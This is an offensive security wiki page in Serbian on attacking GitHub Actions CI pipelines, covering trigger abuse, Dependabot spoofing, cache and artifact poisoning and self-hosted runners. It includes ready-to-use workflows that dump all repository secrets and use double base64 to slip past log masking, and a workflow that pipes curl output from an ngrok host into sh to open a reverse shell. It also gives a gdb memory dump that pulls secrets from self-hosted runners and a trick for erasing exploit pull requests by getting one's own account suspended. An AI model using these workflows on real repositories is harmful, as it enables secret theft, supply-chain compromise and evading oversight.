# Zloupotreba Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Alati

Sledeći alati su korisni za pronalaženje Github Action workflows i čak pronalaženje ranjivih:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Pogledajte i njihov checklist na [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Osnovne informacije

Na ovoj strani ćete naći:

- Kratak **sažetak svih uticaja** koje napadač može ostvariti ako dobije pristup Github Action
- Različite načine da **dobili pristup akciji**:
- Imati **permissions** za kreiranje akcije
- Zloupotreba **pull request** povezanih okidača
- Zloupotreba **other external access** tehnika
- **Pivoting** iz već kompromitovanog repozitorijuma
- Na kraju, sekcija o **post-exploitation** tehnikama za zloupotrebu akcije iznutra (da bi se postigli gore navedeni uticaji)

## Sažetak uticaja

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

Ako možete **execute arbitrary code in GitHub Actions** unutar **repository**, možda ćete moći da:

- **Steal secrets** montirane na pipeline i **abuse the pipeline's privileges** da biste dobili neautorizovan pristup eksternim platformama, kao što su AWS i GCP.
- **Compromise deployments** i druge **artifacts**.
- Ako pipeline deploy-uje ili čuva asset-e, mogli biste izmeniti finalni proizvod, omogućavajući supply chain napad.
- **Execute code in custom workers** da biste zloupotrebili računarsku snagu i pivot-ovali na druge sisteme.
- **Overwrite repository code**, u zavisnosti od permissions povezanih sa `GITHUB_TOKEN`.

## GITHUB_TOKEN

Ovaj "**secret**" (dolazi iz `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) se dodeljuje kada admin omogući ovu opciju:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Ovaj token je isti koji će koristiti **Github Application**, pa može pristupiti istim endpoint-ima: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.

Možete videti moguće **permissions** ovog tokena ovde: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Imajte na umu da token **ističe nakon završetka job-a**.\
Ovi tokeni izgledaju ovako: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Neke interesantne stvari koje možete uraditi sa ovim tokenom:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Imajte na umu da ćete u više navrata moći da pronađete **github user tokens inside Github Actions envs or in the secrets**. Ovi tokeni mogu vam dati veće privilegije nad repozitorijumom i organizacijom.

<details>

<summary>Prikaži secrets u Github Action output</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijte reverse shell koristeći secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Moguće je proveriti dozvole dodeljene Github Token-u u repozitorijumima drugih korisnika **proverom logova Github actions**:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozvoljeno izvršavanje

> [!NOTE]
> Ovo bi bio najlakši način da kompromitujete Github actions, jer ovaj slučaj podrazumeva da imate pristup da **kreirate novi repo u organizaciji**, ili da imate **privilegije za pisanje nad repozitorijumom**.
>
> Ako ste u ovoj situaciji, jednostavno možete proveriti [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Izvršavanje kreiranjem repozitorijuma

U slučaju da članovi organizacije mogu **kreirati nove repozitorijume** i ako možete izvršavati Github actions, možete **kreirati novi repo i ukrasti tajne postavljene na nivou organizacije**.

### Izvršavanje iz nove grane

Ako možete **kreirati novu granu u repozitorijumu koji već sadrži konfigurisan Github Action**, možete ga **izmeniti**, **upload-ovati** sadržaj, i potom **pokrenuti taj action iz nove grane**. Na ovaj način možete **eksfiltrirati tajne repozitorijuma i organizacije** (ali morate znati kako se zovu).

> [!WARNING]
> Bilo koje ograničenje implementirano samo unutar workflow YAML (na primer, `on: push: branches: [main]`, job conditionals, or manual gates) može biti izmenjeno od strane saradnika. Bez spoljnog sprovođenja (branch protections, protected environments, and protected tags), saradnik može preusmeriti workflow da se pokrene na svojoj grani i zloupotrebiti montirane secrets/permissions.

Možete učiniti izmenjeni action izvršnim **ručno,** kada je **PR kreiran** ili kada je **neki kod push-ovan** (u zavisnosti od toga koliko želite da budete bučni):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Izvršavanje iz fork-a

> [!NOTE]
> Postoje različiti okidači koji bi napadaču mogli omogućiti da **izvrši Github Action drugog repozitorijuma**. Ako su ti okidači loše konfigurisani, napadač bi mogao da ih kompromituje.

### `pull_request`

Okidač workflow-a **`pull_request`** će izvršiti workflow svaki put kada se primi pull request uz neka izuzeća: po defaultu ako je to **prvi put** da sarađujete, neki **održavalac** će morati da **odobri** **pokretanje** workflow-a:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Pošto je podrazumevano ograničenje za **first-time** contributore, mogli biste doprineti ispravljanjem validnog bug/typo i potom poslati druge PR-ove da zloupotrebite svoje nove `pull_request` privilegije.
>
> **Isprobao sam ovo i ne radi**: ~~Druga opcija bi bila da kreirate nalog sa imenom nekoga ko je doprineo projektu i obriše svoj nalog.~~

Pored toga, po defaultu **prevents write permissions** i **secrets access** ciljnog repozitorijuma kao što je pomenuto u [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Sa izuzetkom `GITHUB_TOKEN`, **secrets se ne prosleđuju runner-u** kada je workflow pokrenut iz **forked** repozitorijuma. **`GITHUB_TOKEN` ima dozvole samo za čitanje** u pull request-ovima **iz forked repozitorijuma**.

Napadač može izmeniti definiciju Github Action da bi izvršio proizvoljne stvari i dodao proizvoljne akcije. Međutim, neće moći da ukrade secrets ili prepiše repozitorijum zbog pomenutih ograničenja.

> [!CAUTION]
> **Da, ako napadač promeni u PR-u github action koja će biti pokrenuta, njegova Github Action će biti ona koja se koristi i ne ona iz origin repo-a!**

Pošto napadač takođe kontroliše kod koji se izvršava, čak i ako nema secrets ili write permissions na `GITHUB_TOKEN`, napadač bi, na primer, mogao **upload malicious artifacts**.

### **`pull_request_target`**

Okidač workflow-a **`pull_request_target`** ima **write permission** nad ciljanim repozitorijumom i **access to secrets** (i ne traži dozvolu).

Obratite pažnju da okidač workflow-a **`pull_request_target`** **pokreće se u osnovnom kontekstu** a ne u onom koji daje PR (da bi se izbeglo **izvršavanje nepouzdanog koda**). Za više informacija o `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Pored toga, za više informacija o ovom specifičnom opasnom korišćenju pogledajte ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Može izgledati da zato što je **izvršeni workflow** onaj definisan u **base** i **ne u PR-u** bezbedno je koristiti **`pull_request_target`**, ali postoji nekoliko slučajeva kada to nije tačno.

I ovaj će imati **access to secrets**.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

In this example, a workflow is configured to run after the separate "Run Tests" workflow completes:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Štaviše, prema dokumentaciji: Workflow koji je pokrenut događajem `workflow_run` može da **pristupi secrets i piše tokens, čak i ako prethodni workflow to nije mogao**.

Ovakav workflow može biti napadnut ako **zavisi** od nekog **workflow**-a koji može biti **pokrenut** od strane spoljnog korisnika putem **`pull_request`** ili **`pull_request_target`**. Par ranjivih primera može se [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Prvi se sastoji u tome da `workflow_run` pokrenuti workflow preuzme napadačev kod: `${{ github.event.pull_request.head.sha }}`\
Drugi se sastoji u prosleđivanju **artifact**-a iz **nepouzdanog** koda u `workflow_run` workflow i korišćenju sadržaja tog artifact-a na način koji ga čini podložnim **RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li kada se izvršava iz `pull_request` koristi/preuzima kod iz originalnog repozitorijuma ili iz fork-ovanog PR-a

## Zloupotreba izvršavanja iz fork-a

Pomenuli smo sve načine na koje spoljašnji napadač može naterati github workflow da se izvrši; sada da pogledamo kako se ta izvršavanja, ako su pogrešno konfigurisana, mogu zloupotrebiti:

### Untrusted checkout execution

U slučaju **`pull_request`**, workflow će biti izvršen u **kontekstu PR-a** (dakle izvršiće **maliciozni kod PR-a**), ali neko mora to **prvo autorizovati**, i izvršavaće se sa određenim [ograničenjima](#pull_request).

U slučaju workflow-a koji koristi **`pull_request_target` ili `workflow_run`** i koji zavisi od workflow-a koji može biti pokrenut iz **`pull_request_target` ili `pull_request`**, izvršiće se kod iz originalnog repozitorijuma, tako da **napadač ne može kontrolisati izvršeni kod**.

> [!CAUTION]
> Međutim, ako **action** ima **eksplicitan PR checkout** koji će **preuzeti kod iz PR-a** (a ne iz base), koristiće kod koji kontroliše napadač. Na primer (pogledajte liniju 12 gde se preuzima kod PR-a):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencijalno **nepouzdani kod se izvršava tokom `npm install` ili `npm build`** jer build skripte i referencirani **packages su pod kontrolom autora PR-a**.

> [!WARNING]
> GitHub dork za pretragu ranjivih actions je: `event.pull_request pull_request_target extension:yml` međutim, postoje različiti načini da se jobovi konfigurišu za sigurno izvršavanje čak i ako je action nesigurno konfigurisana (npr. korišćenjem uslova o tome ko je actor koji generiše PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Imajte na umu da postoje određeni [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) čije vrednosti su **kontrolisane** od strane **korisnika** koji kreira PR. Ako github action koristi te **podatke za izvršavanje bilo čega**, to može dovesti do **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Prema dokumentaciji: Možete učiniti da je **promenljiva okruženja dostupna svim narednim koracima** u workflow jobu tako što ćete definisati ili ažurirati promenljivu okruženja i upisati je u **`GITHUB_ENV`** fajl okruženja.

Ako napadač može **ubaciti bilo koju vrednost** u ovu **env** promenljivu, mogao bi ubaciti env promenljive koje mogu izvršiti kod u narednim koracima, kao što su **LD_PRELOAD** ili **NODE_OPTIONS**.

Na primer ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite workflow koji veruje uploadovanom artifact-u da sačuva njegov sadržaj u **`GITHUB_ENV`** env promenljivu. Napadač bi mogao da upload-uje nešto ovako da ga kompromituje:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Kao što je naznačeno u [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), nekoliko organizacija ima Github Action koji merguje bilo koji PRR od `dependabot[bot]` kao u:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Što je problem zato što polje `github.actor` sadrži korisnika koji je izazvao poslednji događaj koji je pokrenuo workflow. Postoji nekoliko načina da se natera korisnik `dependabot[bot]` da izmeni PR. Na primer:

- Napravite fork repozitorijuma žrtve
- Dodajte maliciozni payload u svoju kopiju
- Omogućite Dependabot na vašem forku dodavanjem zastarele zavisnosti. Dependabot će kreirati granu koja ispravlja zavisnost sa malicioznim kodom.
- Otvorite Pull Request prema repozitorijumu žrtve iz te grane (PR će biti kreiran od strane korisnika pa se još ništa neće desiti)
- Zatim, napadač se vraća na inicijalni PR koji je Dependabot otvorio u njegovom forku i izvršava `@dependabot recreate`
- Zatim, Dependabot izvrši određene akcije u toj grani koje su izmenile PR u repozitorijumu žrtve, što čini da `dependabot[bot]` bude actor poslednjeg događaja koji je pokrenuo workflow (i stoga se workflow izvršava).

Dalje, šta ako umesto mergovanja Github Action ima command injection kao u:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Dakle, originalni blogpost predlaže dve opcije za zloupotrebu ovog ponašanja, pri čemu je druga:

- Napravite fork repozitorijuma žrtve i omogućite Dependabot sa nekom zastarelom zavisnošću.
- Kreirajte novu granu sa malicioznim shell injection kodom.
- Promenite default branch repozitorijuma na tu granu.
- Kreirajte PR iz ove grane prema repozitorijumu žrtve.
- Pokrenite `@dependabot merge` u PR-u koji je Dependabot otvorio u svom forku.
- Dependabot će spojiti njegove izmene u default branch vašeg forkovanog repozitorijuma, ažurirajući PR u repozitorijumu žrtve, čineći sada `dependabot[bot]` akterom poslednjeg događaja koji je pokrenuo workflow i koristeći maliciozno ime grane.

### Ranljive Github Actions treće strane

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kao što je pomenuto u [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ova Github Action omogućava pristup artefaktima iz različitih workflow-ova, pa čak i iz drugih repozitorijuma.

Problem je u tome da ako parametar **`path`** nije postavljen, artefakt se ekstrahuje u trenutni direktorijum i može prepisati fajlove koji bi kasnije mogli biti korišćeni ili čak izvršavani u workflow-u. Dakle, ako je artefakt ranjiv, napadač bi ovo mogao iskoristiti da kompromituje druge workflow-ove koji veruju tom artefaktu.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo se može napasti ovim workflow-om:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Ostali eksterni pristup

### Deleted Namespace Repo Hijacking

Ako nalog promeni ime, drugi korisnik može registrovati nalog sa tim imenom nakon nekog vremena. Ako je repository imao **manje od 100 zvezdica pre promene imena**, Github će omogućiti novom registrovanom korisniku sa istim imenom da kreira **repository sa istim imenom** kao onaj koji je obrisan.

> [!CAUTION]
> Dakle, ako action koristi repo iz nepostojećeg naloga, i dalje je moguće da napadač kreira taj nalog i kompromituje action.

Ako drugi repositories koriste **dependencies from this user repos**, napadač će moći da ih hijackuje. Ovde imate detaljnije objašnjenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> U ovom odeljku ćemo govoriti o tehnikama koje bi omogućile da se **pivot from one repo to another** pod pretpostavkom da imamo neki oblik pristupa prvom (pogledajte prethodni odeljak).

### Cache Poisoning

Cache se održava između **workflow runs in the same branch**. To znači da ako napadač uspe da **compromise** neki **package** koji se zatim skladišti u cache i bude **downloaded** i izvršen od strane **more privileged** workflow, moći će da **compromise** i taj workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows mogu koristiti **artifacts from other workflows and even repos**; ako napadač uspe da **compromise** Github Action koji **uploads an artifact** koji se kasnije koristi u drugom workflow-u, mogao bi **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

Kao što je komentarisano u [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), čak i ako repository ili organizacija ima politiku koja ograničava upotrebu određenih actions, napadač može jednostavno download (`git clone`) action unutar workflow-a i zatim ga referencirati kao local action. Pošto policies ne utiču na lokalne putanje, **the action will be executed without any restriction.**

Example:

---
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Pristup AWS i GCP preko OIDC

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Pristup secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadržaj u script, zanimljivo je znati kako možete pristupiti secrets:

- Ako je secret ili token postavljen kao **environment variable**, može se direktno pristupiti kroz environment koristeći **`printenv`**.

<details>

<summary>Prikaži secrets u Github Action output</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijte reverse shell koristeći secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Ako se secret koristi **direktno u izrazu**, generisani shell skript se čuva **na disku** i dostupan je.
- ```bash
cat /home/runner/work/_temp/*
```
- Za JavaScript actions, secrets se šalju putem environment variables
- ```bash
ps axe | grep node
```
- Za **custom action**, rizik može varirati u zavisnosti od toga kako program koristi secret koji je dobio iz **argumenta**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumerate all secrets via the secrets context (collaborator level). A contributor with write access can modify a workflow on any branch to dump all repository/org/environment secrets. Use double base64 to evade GitHub’s log masking and decode locally:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: for stealth during testing, encrypt before printing (openssl is preinstalled on GitHub-hosted runners).

### Zloupotreba Self-hosted runners

Način da se pronađe koje **Github Actions se izvršavaju u non-github infrastrukturi** je da se pretraži **`runs-on: self-hosted`** u Github Action konfiguracionom yaml-u.

**Self-hosted** runners mogu imati pristup **dodatno osetljivim informacijama**, drugim **network systems** (vulnerable endpoints in the network? metadata service?) ili, čak i ako su izolovani i uništeni, **više od jedne action može biti pokrenuto istovremeno** i zlonamerna može **steal the secrets** druge.

U self-hosted runner-ima je takođe moguće dobiti **secrets from the \_Runner.Listener**\_\*\* process\*\* koji će sadržati sve secrets of the workflows u bilo kom koraku dumping its memory:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Moguće je kreirati Github actions koji će **izgraditi i sačuvati Docker image unutar Github-a**.\\
Primer se može naći u sledećem proširivom elementu:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao što možete videti u prethodnom kodu, Github registry je hostovan u **`ghcr.io`**.

Korisnik sa read permissions nad repom će onda moći da preuzme Docker Image koristeći personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Zatim, korisnik bi mogao da pretraži **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Osetljivi podaci u Github Actions logovima

Čak i ako **Github** pokuša da **detect secret values** u actions logovima i **avoid showing** njih, **drugi osetljivi podaci** koji su mogli biti generisani tokom izvršenja akcije neće biti sakriveni. Na primer, JWT potpisan tajnom neće biti sakriven osim ako nije [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Skrivanje tragova

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prvo, svaki podignuti PR je jasno vidljiv javnosti na Github i ciljanom GitHub nalogu. Na GitHub-u po defaultu ne možemo obrisati PR sa interneta, ali postoji caka. Za Github naloge koje je GitHub **suspendovao**, svi njihovi **PRs are automatically deleted** i uklanjaju se sa interneta. Dakle, da biste sakrili svoju aktivnost morate ili da vam se **GitHub account suspended or get your account flagged**. Ovo bi **sakrilo sve vaše aktivnosti** na GitHub-u sa interneta (u suštini ukloniti sve vaše exploit PR)

Organizacija na GitHub-u je veoma proaktivna u prijavljivanju naloga GitHub-u. Sve što treba da uradite je da podelite “some stuff” u Issue i oni će se pobrinuti da vam nalog bude suspendovan za 12 sati :p i eto — vaš exploit postaje nevidljiv na GitHub-u.

> [!WARNING]
> Jedini način da organizacija otkrije da je bila meta je da proveri GitHub logs iz SIEM-a, jer bi iz GitHub UI PR bio uklonjen.

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
